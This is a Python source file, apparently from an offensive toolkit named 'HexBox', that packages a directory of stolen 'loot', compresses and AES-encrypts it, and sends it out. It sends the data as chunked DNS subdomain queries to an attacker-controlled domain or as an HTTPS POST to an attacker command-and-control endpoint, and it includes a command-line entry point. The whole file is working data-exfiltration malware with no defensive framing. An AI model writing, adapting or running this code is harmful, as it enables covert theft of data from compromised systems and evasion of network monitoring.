#!/usr/bin/env python3
# c2/exfil.py — Encrypted loot exfiltration over DNS/HTTPS covert channels
#
# Encryption: AES-256-GCM (pycryptodome, already installed)
# Compression: gzip (stdlib)
# DNS exfil:   raw UDP DNS query packets (stdlib socket, no dnspython needed)
# HTTPS exfil: POST base64-encoded JSON blob to attacker C2 endpoint

import base64, gzip, hashlib, io, json, os, socket, struct, time, zipfile
from pathlib import Path
from secrets import token_hex

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

MAX_LABEL = 50  # base32 chars per DNS label; keeps total FQDN comfortably < 253
DNS_PORT  = 53


# ---------------------------------------------------------------------------
# Crypto helpers
# ---------------------------------------------------------------------------

def _derive_key(raw_key: str) -> bytes:
    return hashlib.sha256(raw_key.encode()).digest()


def _encrypt(data: bytes, key: bytes) -> bytes:
    """Return nonce(12) + tag(16) + ciphertext."""
    nonce  = get_random_bytes(12)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return nonce + tag + ciphertext


def _compress_encrypt(data: bytes, key_str: str) -> bytes:
    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode="wb") as gz:
        gz.write(data)
    return _encrypt(buf.getvalue(), _derive_key(key_str))


# ---------------------------------------------------------------------------
# Packaging
# ---------------------------------------------------------------------------

def package_loot(loot_dir: Path, target_file: str | None = None) -> bytes:
    """Zip loot directory (or single file) and return raw bytes."""
    # Resolve once so containment checks are consistent even if cwd changes
    loot_root = loot_dir.resolve()
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        if target_file:
            p = (loot_root / target_file).resolve()
            if p.is_file() and p.is_relative_to(loot_root):
                zf.write(p, p.name)
        else:
            for f in sorted(loot_root.rglob("*")):
                if f.is_file():
                    zf.write(f, str(f.relative_to(loot_root)))
    return buf.getvalue()


# ---------------------------------------------------------------------------
# DNS exfil — raw UDP
# ---------------------------------------------------------------------------

def _dns_query_packet(fqdn: str) -> bytes:
    txid   = os.urandom(2)
    flags  = b"\x01\x00"   # standard query, RD=1
    counts = b"\x00\x01\x00\x00\x00\x00\x00\x00"
    pkt    = txid + flags + counts
    for label in fqdn.rstrip(".").split("."):
        enc  = label.encode()[:63]
        pkt += bytes([len(enc)]) + enc
    pkt += b"\x00\x00\x01\x00\x01"  # QNAME terminator + QTYPE A + QCLASS IN
    return pkt


def exfil_dns(
    payload: bytes,
    domain: str,
    dns_server: str = "8.8.8.8",
    session_id: str | None = None,
    chunk_size: int = MAX_LABEL,
    throttle_s: float = 0.05,
) -> dict:
    """
    Exfil encrypted bytes as DNS subdomain queries.
    FQDN pattern: {seq:04d}.{chunk_b32}.{session}.exfil.{domain}
    Receiver logs DNS queries and reassembles by session/seq.
    """
    if not domain:
        return {"ok": False, "error": "dns_domain not configured"}

    sid    = session_id or token_hex(4)
    b32    = base64.b32encode(payload).decode().lower().rstrip("=")
    chunks = [b32[i:i + chunk_size] for i in range(0, len(b32), chunk_size)]
    total  = len(chunks)
    sent   = errors = 0

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)
    try:
        for seq, chunk in enumerate(chunks):
            fqdn = f"{seq:04d}.{chunk}.{sid}.exfil.{domain}"
            try:
                sock.sendto(_dns_query_packet(fqdn), (dns_server, DNS_PORT))
                sent += 1
                time.sleep(throttle_s)
            except OSError:
                errors += 1
        # terminator packet carries total chunk count
        sock.sendto(
            _dns_query_packet(f"done.{total:04d}.{sid}.exfil.{domain}"),
            (dns_server, DNS_PORT),
        )
    finally:
        sock.close()

    return {
        "ok":        errors == 0,
        "sent":      sent,
        "errors":    errors,
        "total":     total,
        "session_id": sid,
        "bytes":     len(payload),
    }


# ---------------------------------------------------------------------------
# HTTPS exfil
# ---------------------------------------------------------------------------

def exfil_https(
    payload: bytes,
    url: str,
    token: str = "",
    verify_tls: bool = True,
) -> dict:
    """POST AES-encrypted payload as base64 JSON to attacker C2 endpoint."""
    if not url:
        return {"ok": False, "error": "https_url not configured"}

    import requests as _req

    headers = {"Content-Type": "application/json"}
    if token:
        headers["X-HexBox-Token"] = token

    body = {
        "session": token_hex(4),
        "ts":      str(int(time.time())),
        "data":    base64.b64encode(payload).decode(),
        "size":    len(payload),
    }
    try:
        r = _req.post(url, json=body, headers=headers,
                      timeout=30, verify=verify_tls)
        return {"ok": r.ok, "status": r.status_code, "bytes": len(payload)}
    except Exception as e:
        return {"ok": False, "error": str(e)}


# ---------------------------------------------------------------------------
# High-level entry
# ---------------------------------------------------------------------------

def exfil_loot(
    loot_dir: Path,
    cfg: dict,
    method: str,
    target_file: str | None = None,
) -> dict:
    """
    Package → compress+encrypt → exfil.

    cfg keys:
      aes_key, dns_domain, dns_server, https_url, https_token, https_verify_tls
    method: 'dns' | 'https'
    """
    _DEFAULT_KEY = "change-me-to-32-byte-secret-key!"
    aes_key = cfg.get("aes_key", _DEFAULT_KEY)
    if not aes_key or aes_key == _DEFAULT_KEY:
        import warnings
        warnings.warn(
            "Exfil AES key is the public default — change 'aes_key' in config.json. "
            "All exfil traffic can be decrypted by anyone with the source code.",
            stacklevel=2,
        )

    raw       = package_loot(loot_dir, target_file)
    encrypted = _compress_encrypt(raw, aes_key)

    if method == "dns":
        return exfil_dns(
            encrypted,
            domain     = cfg.get("dns_domain", ""),
            dns_server = cfg.get("dns_server",  "8.8.8.8"),
        )
    if method == "https":
        return exfil_https(
            encrypted,
            url        = cfg.get("https_url",        ""),
            token      = cfg.get("https_token",       ""),
            verify_tls = cfg.get("https_verify_tls",  True),
        )
    return {"ok": False, "error": f"Unknown method: {method}"}


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import argparse

    ap = argparse.ArgumentParser(description="HexBox loot exfiltration")
    ap.add_argument("method",   choices=["dns", "https"],    help="Exfil channel")
    ap.add_argument("--loot",   default="~/hexbox/loot",     help="Loot directory")
    ap.add_argument("--config", default="~/hexbox/config.json")
    ap.add_argument("--file",   default=None,
                    help="Single file path relative to loot dir; omit for full archive")
    args = ap.parse_args()

    cfg_path = Path(os.path.expanduser(args.config))
    cfg: dict = {}
    if cfg_path.exists():
        cfg = json.loads(cfg_path.read_text()).get("exfil", {})

    result = exfil_loot(
        Path(os.path.expanduser(args.loot)),
        cfg,
        args.method,
        args.file,
    )
    print(json.dumps(result, indent=2))
